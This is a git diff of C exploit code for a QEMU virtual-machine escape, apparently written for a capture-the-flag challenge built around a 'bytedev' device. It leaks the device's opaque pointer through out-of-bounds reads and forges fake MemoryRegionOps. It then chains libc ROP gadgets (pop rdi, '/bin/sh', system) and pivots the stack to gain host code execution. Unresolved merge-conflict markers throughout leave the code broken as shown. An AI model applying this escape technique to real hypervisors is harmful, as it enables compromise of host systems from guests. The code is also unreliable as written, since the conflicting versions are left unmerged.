@@ -47,6 +47,8 @@
 #define LIBC_SYSTEM 0x50d60
 #define LIBC_MOV_RSP_RDX_RET 0x5a170
 #define LIBC_MOV_RDX_PTRRDIADD8_MOV_PTRRSP_RAX_CALL_PTRRDXADD0x20 0x1675b0
+#define LIBC_POP_RDI_RET 0x2a3e5
+#define LIBC_BIN_SH 0x1d8698
 
 enum BYTEDEV_MODE {
     BYTEDEV_MODE_STREAM = 0,
@@ -282,6 +284,15 @@ void qemuEscape(void)
     byte_dev_pmio_read = buf[0];
     printf("\033[32m\033[1m[+] Got byte_dev_pmio_read: \033[0m%llx\n", 
             byte_dev_pmio_read);
+<<<<<<< HEAD
+=======
+    
+    puts("\033[34m\033[1m[*] Reading from -347 sector...\033[0m");
+    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, -347);
+    read(dev_fd, buf, 10 * sizeof(uint64_t));
+    opaque = buf[4];
+    printf("\033[32m\033[1m[+] Got opaque: \033[0m%llx\n", opaque);
+>>>>>>> d8323eb (exp...)
 
     /**
      * Step.II construct fake pmio->ops
@@ -289,16 +300,30 @@ void qemuEscape(void)
      * so that nothing will be effects
      */
 
+    /**
+     * TODO: a more valid MemoryRegionOps is needed
+     * we need to make a better one
+     * try with empty bar space?
+     */
+
     puts("");
     puts("\033[34m\033[1m[*] Step.II construct fake pmio->ops\033[0m");
     
     ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, -24);
     read(dev_fd, buf, 35 * sizeof(uint64_t));
+<<<<<<< HEAD
+=======
+
+    buf[26]  = buf[27] = 0;
+    strcpy(&buf[26], "cat ./flag");
+    buf[28] = byte_dev_pmio_read;
+>>>>>>> d8323eb (exp...)
     /**
      * mov rdx, qword ptr [rdi + 8] ; -> store the ptr in opaque[1]
      * mov qword ptr [rsp], rax ; 
      * call qword ptr [rdx + 0x20]  -> another call
      */
+<<<<<<< HEAD
     buf[27] = byte_dev_pmio_read;
     buf[28] = 
         libc_base + LIBC_MOV_RDX_PTRRDIADD8_MOV_PTRRSP_RAX_CALL_PTRRDXADD0x20;
@@ -308,12 +333,31 @@ void qemuEscape(void)
     buf[30] = 
     buf[31] = 
     buf[32] = 
+=======
+    buf[29] = 
+        libc_base + LIBC_MOV_RDX_PTRRDIADD8_MOV_PTRRSP_RAX_CALL_PTRRDXADD0x20;
+
+    /* the new rdx starts there */
+    buf[30] = libc_base + LIBC_POP_RDI_RET;
+    buf[31] = libc_base + LIBC_BIN_SH;
+    buf[32] = libc_base + LIBC_SYSTEM;
+    //buf[33] = 
+>>>>>>> d8323eb (exp...)
     /**
      * [rdx + 20]
      * mov rsp, rdx ; ret
      */
+<<<<<<< HEAD
     */
     buf[33] = libc_base + LIBC_MOV_RSP_RDX_RET;
+=======
+    buf[34] = libc_base + LIBC_MOV_RSP_RDX_RET;
+
+    /* the [rdi + 8] */
+    buf[1] = opaque + 30 * 8;
+
+    write(dev_fd, buf, 35 * sizeof(uint64_t));
+>>>>>>> d8323eb (exp...)
 
     /**
      * Step.III 
@@ -333,10 +377,12 @@ void qemuEscape(void)
 
     ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, -347);
     read(dev_fd, buf, 10 * sizeof(uint64_t));
-    opaque = buf[4];
-    printf("\033[32m\033[1m[+] Got opaque: \033[0m%llx\n", opaque);
 
+<<<<<<< HEAD
     buf[9] = opaque + 27 * 8;
+=======
+    buf[9] = opaque + 28 * 8;
+>>>>>>> d8323eb (exp...)
     write(dev_fd, buf, 10 * sizeof(uint64_t));
 
     /**
@@ -348,6 +394,10 @@ void qemuEscape(void)
     puts("");
     puts("\033[34m\033[1m[*] Step.V trigger fake ops to escape\033[0m");
 
+<<<<<<< HEAD
+=======
+    sleep(5);
+>>>>>>> d8323eb (exp...)
     ioctl(dev_fd, BYTEDEV_MODE_CHANGE, *(size_t*)"arttnba3");
 }
 
